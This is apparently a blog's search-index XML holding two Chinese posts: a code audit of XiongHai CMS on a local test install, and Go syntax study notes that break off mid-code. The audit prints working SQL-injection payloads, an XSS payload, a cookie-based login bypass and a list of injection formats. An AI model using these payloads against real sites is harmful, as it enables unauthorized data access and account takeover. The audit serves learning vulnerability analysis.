<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>熊海CMS代码审计</title>
      <link href="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我挖了一段时间的教育src后，虽然自己有0day，但是还是发现自己的代码审计能力有很大的欠缺，所以，就写了我的第一次的代码审计过程。</p><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p>首先先看一下index.php的源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//单一入口模式</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭错误显示</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//接收文件名,只接受了一个文件名，可能存在漏洞</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token operator">?</span><span class="token string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//判断为空或者等于index</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'files/'</span><span class="token punctuation">.</span><span class="token variable">$action</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//载入相应文件</span><span class="token delimiter">?></span></code></pre><p>其中对于通过GET得到的参数并没有进行过滤，所以我们可以利用此参数来进行越级访问，这里我事先在文件夹里放了一个phpinfo的php文件</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt></p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p><p>接下来来看file中的index.php文件，看下源码</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt></p><p>其中在开始包含了几个文件，由于是在代码中是写死的，所以无法利用其进行进一步操作，再接着往下看，将SELECT * FROM settings这个MySQL的查询语句直接赋值给query变量，接下再利用mysql_query函数进行查询返回的是一个指针类型，将其再利用mysql_fetch_qrrqy函数得到具体的值，并赋值给info变量，接下的代码中类似info[‘keywords’]相当于从info这个变量中取值，接下来我们接着往下看，忽略写死的文件包含和没有什么卵用的从info变量中取值，我发现在第34行处有一个很有趣的herf，首先它给了我们参数?r=content&amp;cid=<?php echo $toutiaoimg['id']?>，我们在访问这个cms的某一篇文章时url参数为：<a href="http://127.0.0.1/dmsj2/?r=content&amp;cid=5，很显然这里的参数有点意思，它首先能够和我i们有交互，同时还与MySQL有联系，所以就意味着有注入，接下来我们跟进以下这个参数，由于其中?r=content，所以就去content.php中看一看，" target="_blank" rel="noopener">http://127.0.0.1/dmsj2/?r=content&amp;cid=5，很显然这里的参数有点意思，它首先能够和我i们有交互，同时还与MySQL有联系，所以就意味着有注入，接下来我们跟进以下这个参数，由于其中?r=content，所以就去content.php中看一看，</a></p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png" alt></p><p>在第8行对这个传入的参数做了一定的过滤，过滤函数为addslashes函数，它的主要作用为将传入的参数中的单引号，双引号等符号前加斜杠，也就意味着我们平常的注入方法肯定不行所以就要利用其他的注入方法，由于这个代码在第19行处直接引用了id参数并美哦与及逆行再次过滤，所以就产生了注入，这里我利用的是报错住注入<del>（宽字节注入我注不出来）</del>,</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//注入语句</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/dmsj2/?r=content&amp;cid=2 or (select%20extractvalue(1,concat(0x7e,(select%20database()))))</span></code></pre><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" alt></p><p>同样的在index.php的第86行也有这样的注入漏洞，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" alt></p><p>我们对这个id参数跟进一下，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png" alt></p><p>发现这里也是之利用了addslashes函数进行了过滤，在第13行处没有进行二次过滤，所以可以利用报错注入进行利用</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png" alt></p><p>pyload为：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>software<span class="token operator">&amp;</span>cid<span class="token operator">=</span><span class="token number">2</span><span class="token operator">%</span>20or<span class="token operator">%</span><span class="token function">20</span><span class="token punctuation">(</span>select<span class="token operator">%</span><span class="token function">20extractvalue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select<span class="token operator">%</span><span class="token function">20database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>目前在index.php中的漏洞代码我已知的就这么多，</p><p>接下来去其他的php文件中找找看还有没有漏洞，查看了about.php的代码，以为在对传入的r这个参数进行了过滤的话可能是存在注入，结果没有，接下来看contact.php，里边有对r和page这两个GET请求的参数都做了函数过滤，加上后边的语句闭合必须要用到单引号，所以就没有注入了，不过，查看源代码发现对于page参数没有做很严格的过滤，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png" alt></p><p>所以其存在xss，playload为：</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/dmsj2/?r=contact&amp;page=1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre><p>再往下看就没有什么能够注入的地方了，直接换下一个PHP文件。</p><p>接着是content.php文件，此文件存在一个报错注入，在上边已经说过了，我们接着往下看，中间要么是写死的SQL查询语句，要么是需要我们利用单引号闭合，加上边函数的过滤所以没有注入，直到在第154行处，留言的功能处，有一个传参的php，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png" alt></p><p>跟进一下，查看一下submit.php这个php文件代码，上来就看见传入不少的参数<del>（很快啊）</del>，先是整一手session再进行函数过滤，瞬间感觉就不友好了<del>（啪的一下快乐没了）</del>,接着往下看在第66行处，发现对mail没有进行过滤，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png" alt></p><p>所以直接注它，这里我由于本地环境的原因对这个cms进行了重装（嫖别人已经搭建好的cms），所以接下来的url和上边不一样，</p><p>接着上边的注入，利用burp对mail参数进行注入</p><pre class=" language-php"><code class="language-php">'<span class="token punctuation">)</span><span class="token operator">%</span>20and<span class="token operator">%</span><span class="token function">20updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span></code></pre><p>得到回显</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png" alt></p><p>再接着往下看，在第176行处，对没有过滤的cid参数进行直接利用，所以直接注它</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png" alt></p><p>payload为：</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">)</span><span class="token operator">%</span>20and<span class="token operator">%</span><span class="token function">20updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span></code></pre><p>得到回显</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png" alt></p><p>不过值得注意的是如果想要利用cid进行注入，是有前提条件的，在submit.php代码的第150行处需要pltz这个参数为1，在105行的注释中表明这个参数为新留言评论通知，具体设置需要在后台的高级设置中，新评论通知站长处打勾。</p><p>几处其他的xss：</p><p>在前端留言处的昵称和留言内容处由于没有对输入的内容进行限制，如果我们留言内容为xss代码则会导致xss，同时由于留言是需要存储在数据库中的，所以这为存储型的xss，具体演示过程就不再展示了。</p><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>先访问admin目录下的index.php，相对于前端的index.php，admin目录下这个直接把get的参数在index中利用函数进行了过滤，但是仍存在越权访问的漏洞，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png" alt></p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.png" alt></p><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p>接下来看login.php的代码，首先对于用户名没有进行过滤，所以直接报错注入，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png" alt></p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png" alt></p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png" alt></p><h3 id="file-index-php"><a href="#file-index-php" class="headerlink" title="file/index.php"></a>file/index.php</h3><p>再回过头来看file/index.php，开头看到了包含了其他的PHP文件，con.php是连接数据库的文件，checklogin.php则是登陆检验，</p><p>其源代码为：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ?r=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>在checklogin.php中对于cookie只做了是否为空的验证，所以，直接整一个不为空的cookie可直接绕过登录，</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png" alt></p><p>接往下看，全是写死的SQL查询语句，直接下一个</p><p>查看adset.php文件，首先是利用post的方式传入三个参数，但是由于addslashes函数的过滤，且如果要注入的话需要用到单引号闭合，所以这里没有注入漏洞，往下看也全是前端代码，所以直接下一个</p><h3 id="columnlist-php"><a href="#columnlist-php" class="headerlink" title="columnlist.php"></a>columnlist.php</h3><p>查看columnlist.php文件，为删除模块，上来就看见两个get请求，往下看没有对参数进行过滤，所以直接利用删除注入，payload：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>columnlist<span class="token operator">&amp;</span>delete<span class="token operator">=</span><span class="token number">3</span><span class="token string">'%20and%20(select%20extractvalue(1,concat(0x7e,(select%20database()))))%20and%20'</span></code></pre><p>这里由于我自己对于删除注入的格式不了解导致卡壳，<del>果然还是太菜了</del>，一般的删除注入格式如下：</p><pre class=" language-php"><code class="language-php">   <span class="token string">'or（有效载荷）or'</span>    <span class="token string">'and（有效载荷）and'</span>    <span class="token string">'or（有效载荷）and'</span>    <span class="token string">'or（有效载荷）and'</span><span class="token operator">=</span>'    <span class="token string">'*（有效载荷）*'</span>    <span class="token string">'or（有效载荷）and'</span>     <span class="token string">"- （有效载荷） - "</span></code></pre><p>往下看就都是写死的SQL语句了，所以换下一个</p><p>接下来是commitlist.php文件，是后台对评论管理的文件，查看源码，在第31行处get请求了删除参数，往下直接对其没有进行过滤就直接进行利用，所以和上边一样直接利用报错注入，再往下的有关SQL的语句就都是写死的查询和输出了。</p><h3 id="editcolumn-php"><a href="#editcolumn-php" class="headerlink" title="editcolumn.php"></a>editcolumn.php</h3><p>查看源代码，上来就是get参数，且没有对id这个进行过滤就直接利用，所以直接利用报错注入注它，payload为：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>editcolumn<span class="token operator">&amp;</span>type<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'%20or%20(select%20extractvalue(1,concat(0x7e,(select%20database()))))or%20'</span></code></pre><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png" alt></p><p>再往下的源码中对我们写的东西完全没有过滤且存储到了数据库中，所以可以写xss的代码形成存储型xss，具体的演示工程就不再演示了（我的后台被自己玩xssx崩了一次），再往下就没什么可以利用的了。</p><h3 id="editlink"><a href="#editlink" class="headerlink" title="editlink"></a>editlink</h3><p>直接上源码</p><p><img src="/2021/07/09/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/23.png" alt></p><p>这个页面的漏洞和上边的editcolumn.php是一样的所以这里就不多说了</p><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>在看过几个php文件之后，在manageinfo.php，newcolumn.php，editsoft.php，new.php,newsoft.php,newwz.php,seniorest.php,siteset.php,由于对输入的数据没有经过过滤，所以可以将xss单吗写入，导致存储型的xss.</p><h3 id="reply-php"><a href="#reply-php" class="headerlink" title="reply.php"></a>reply.php</h3><p>由于对于回复评论的内容没有进行限制，所以存在存储型xss，同时get请求的参数id没有进行过滤，所以出现了和上边一样的SQL注入。</p><p>至于softlist.php和walist.php则存在delete的报错注入，其payload为：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>columnlist<span class="token operator">&amp;</span>delete<span class="token operator">=</span><span class="token number">3</span><span class="token string">'%20and%20(select%20extractvalue(1,concat(0x7e,(select%20database()))))%20and%20'</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>go学习笔记</title>
      <link href="/2021/05/13/go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/13/go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Go语言"><a href="#Go语言" class="headerlink" title="Go语言"></a>Go语言</h1><p>Go语言类似于c语言一样是编译型的语言，编译过程为将认为可读懂的代码转换为01二进制送给机器进行编译</p><p>对Go语言代码的基本认识</p><p><img src="/2021/05/13/go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="Go语言的基本"></p><h2 id="Go语言语法"><a href="#Go语言语法" class="headerlink" title="Go语言语法"></a>Go语言语法</h2><p>在命令行中对我们所写的Go语言代码进行编译为exe可执行文件：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> build          <span class="token comment" spellcheck="true">//将当前所写的代码编译为可执行的exe文件</span><span class="token keyword">go</span> run            <span class="token comment" spellcheck="true">//类似于python脚本的执行方式执行当前Go语言代码</span><span class="token keyword">go</span> build <span class="token operator">-</span>o wdnmd   <span class="token comment" spellcheck="true">//将当前Go语言代码编译为文件名为wdnmd的exe可执行文件</span></code></pre><p>其中<code>go build</code>语法如果我们想要在不是Go语言代码所在文件中将其编译语法如下</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> build <span class="token comment" spellcheck="true">//想要执行的Go语言代码在GOPATH/src之后的位置</span></code></pre><p>例如如果我想要执行在src文件夹中1文件夹中的Go语言代码语法为：</p><pre class=" language-shell"><code class="language-shell">go build  1</code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> insatll        <span class="token comment" spellcheck="true">//此命令为先将当前的Go语言代码进行编译为可执行文件再将其放在GOPATH/bin目录下</span></code></pre><h2 id="Go语言中的变量声明"><a href="#Go语言中的变量声明" class="headerlink" title="Go语言中的变量声明"></a>Go语言中的变量声明</h2><h3 id="普通变量"><a href="#普通变量" class="headerlink" title="普通变量"></a>普通变量</h3><p>Go语言中可以在函数外进行变量的声明对于变量的声明语句</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> name <span class="token builtin">string</span>       <span class="token comment" spellcheck="true">//声明一个名字为name的string型的变量可以是全局变量也可以是局部变量</span><span class="token keyword">var</span> age  <span class="token builtin">int</span>          <span class="token comment" spellcheck="true">//声明一个名字为age的int型变量可以是全局变量也可以是局部变量</span></code></pre><p>对于多个变量可以进行以下的声明</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span><span class="token punctuation">(</span>   a <span class="token builtin">string</span>   b <span class="token builtin">int</span>   c <span class="token builtin">bool</span><span class="token punctuation">)</span></code></pre><p>全局变量在声明且被赋值后如果没有对其进行利用的话Go语言会出现报错，同时非全局变量在被声明后如果未被利用（不对其进行赋值也会报错）也会报错，Go语言规定一个被赋值的变量必须被利用否则会报错，如果只是对一个变量进行了声明没有进行赋值则不会被报错。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> name <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"lsp"</span>   <span class="token comment" spellcheck="true">//对变量进行声明并且赋值</span><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">"lsp"</span>       <span class="token comment" spellcheck="true">//对变量直接进行赋值，Go语言会对其进行类型推测</span>name <span class="token operator">:=</span> <span class="token string">"lsp"</span>           <span class="token comment" spellcheck="true">//只能用于函数中的局部变量的赋值</span></code></pre><h3 id="匿名变量"><a href="#匿名变量" class="headerlink" title="匿名变量"></a>匿名变量</h3><p>Go语言中定义了一个匿名变量<code>_</code>有时我们对于一个函数的返回值只想接受一个返回值这时就会用到匿名变量，用匿名变量来接收不想收到的变量数据，因为匿名变量不占用内存空间也不会被分配内存所以我们所传输的数据就无了</p><p>在同一个作用域中对于同名的变量不能进行二次声明会出现报错</p><h2 id="Go语言中的打印函数"><a href="#Go语言中的打印函数" class="headerlink" title="Go语言中的打印函数"></a>Go语言中的打印函数</h2><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>变量名<span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">//类似于python的打印函数</span>fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"名字为：%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//类似于c++的打印函数</span>fmt<span class="token punctuation">.</span><span class="token function">Ptintln</span><span class="token punctuation">(</span>变量名<span class="token punctuation">)</span>             </code></pre><h2 id="Go语言中的常量"><a href="#Go语言中的常量" class="headerlink" title="Go语言中的常量"></a>Go语言中的常量</h2><p>Go语言中的如果想要设置一个无法被改变的量则需要用到const对一个变量进行声明</p><pre class=" language-go"><code class="language-go"><span class="token keyword">const</span> age <span class="token operator">=</span> <span class="token number">18</span>      将age作为一个值为<span class="token number">18</span>的常量<span class="token keyword">const</span><span class="token punctuation">(</span>    age <span class="token operator">=</span> <span class="token number">18</span>    grade <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//批量进行常量的声明</span><span class="token keyword">const</span><span class="token punctuation">(</span>   n1 <span class="token operator">=</span> <span class="token number">100</span>   n2   n3<span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">//批量进行常量的声明若不做特殊设置则默认n2和n3以及往下的常量值均为n1的值   </span><span class="token keyword">const</span><span class="token punctuation">(</span>   n1 <span class="token operator">=</span> <span class="token boolean">iota</span>   n2   n3<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">/*其中n1所赋值的iota在const关键字出现时将被重置为0(const 内部的第一行之前)，const中每新增一行常量声明将使iota计数一次(iota可理解为const语句块中的行索引)所以n2为1，n3为2*/</span></code></pre><p>左移运算符：</p><pre class=" language-go"><code class="language-go"><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//将1左移10为结果为10000000000</span></code></pre><h2 id="Go语言中的数字类型"><a href="#Go语言中的数字类型" class="headerlink" title="Go语言中的数字类型"></a>Go语言中的数字类型</h2><p>Go 也有基于架构的类型，例如：int、uint 和 uintptr。</p><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>uint8</strong> 无符号 8 位整型 (0 到 255)</td></tr><tr><td>2</td><td><strong>uint16</strong> 无符号 16 位整型 (0 到 65535)</td></tr><tr><td>3</td><td><strong>uint32</strong> 无符号 32 位整型 (0 到 4294967295)</td></tr><tr><td>4</td><td><strong>uint64</strong> 无符号 64 位整型 (0 到 18446744073709551615)</td></tr><tr><td>5</td><td><strong>int8</strong> 有符号 8 位整型 (-128 到 127)</td></tr><tr><td>6</td><td><strong>int16</strong> 有符号 16 位整型 (-32768 到 32767)</td></tr><tr><td>7</td><td><strong>int32</strong> 有符号 32 位整型 (-2147483648 到 2147483647)</td></tr><tr><td>8</td><td><strong>int64</strong> 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>float32</strong> IEEE-754 32位浮点型数</td></tr><tr><td>2</td><td><strong>float64</strong> IEEE-754 64位浮点型数</td></tr><tr><td>3</td><td><strong>complex64</strong> 32 位实数和虚数</td></tr><tr><td>4</td><td><strong>complex128</strong> 64 位实数和虚数</td></tr></tbody></table><h3 id="其他数字类型"><a href="#其他数字类型" class="headerlink" title="其他数字类型"></a>其他数字类型</h3><p>以下列出了其他更多的数字类型：</p><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>byte</strong> 类似 uint8</td></tr><tr><td>2</td><td><strong>rune</strong> 类似 int32</td></tr><tr><td>3</td><td><strong>uint</strong> 32 或 64 位</td></tr><tr><td>4</td><td><strong>int</strong> 与 uint 一样大小</td></tr><tr><td>5</td><td><strong>uintptr</strong> 无符号整型，用于存放一个指针</td></tr></tbody></table><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>Go语言中小数默认是float64类型的，且float32位的数值不能赋值给float64位</p><p>对变量的类型进行float32位的声明语法：</p><pre class=" language-go"><code class="language-go">num <span class="token operator">:=</span> <span class="token function">float32</span><span class="token punctuation">(</span><span class="token number">1.123456</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//num变量的数值类型此时为32位</span></code></pre><p>Go语言中对于布尔值有较为严格的限制，对于一个变量声明为布尔类型则默认为false，布尔值不能参与运算（与Python不同），且其他数据类型也不能强制转换为布尔类型，布尔类型也无法转换为其他类型</p><h2 id="Go语言中的字符串"><a href="#Go语言中的字符串" class="headerlink" title="Go语言中的字符串"></a>Go语言中的字符串</h2><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//打印s1变量的长度</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>name<span class="token operator">+</span>age<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//将name和age两个变量进行拼接输出</span>ss1<span class="token operator">=</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//将name变量和age变量进行拼接后赋值给ss1变量</span></code></pre><p>将一段字符串进行分割</p><pre class=" language-go"><code class="language-go">ret <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>s3<span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//将一段字符串以\进行分割例如s3的值为：lsp\wdnmd 分割后就为：lsp wdnmd</span></code></pre><p>判断字符串中是否含有指定的字符串</p><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span><span class="token string">"wd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断ss这个变量中是否含有wd这个字符如果含有则输出true没有则输出false</span></code></pre><p>判断字符串是否以指定的字符串结尾/开始</p><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//判断ss变量是否以a结束（返回值为true或false）</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//判断ss变量是否以a开始（返回值为true或false）</span></code></pre><p>找到某字符串中指定字符串的位置</p><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//输出ss变量中字符c第一次出现的位置</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">LastIndex</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//输出ss变量中字符c最后一次出现的位置</span></code></pre><p>字符串拼接</p><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//将ss中的字符串用+好进行拼接</span></code></pre><h2 id="if-else-语句"><a href="#if-else-语句" class="headerlink" title="if else 语句"></a>if else 语句</h2><p>Go语言中有着这样的if语句同c语言不同</p><pre class=" language-go"><code class="language-go"><span class="token keyword">if</span> age<span class="token operator">:=</span><span class="token number">19</span><span class="token punctuation">;</span> age<span class="token operator">></span><span class="token number">18</span><span class="token punctuation">{</span>       fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"lsp"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"xxs"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                             <span class="token comment" 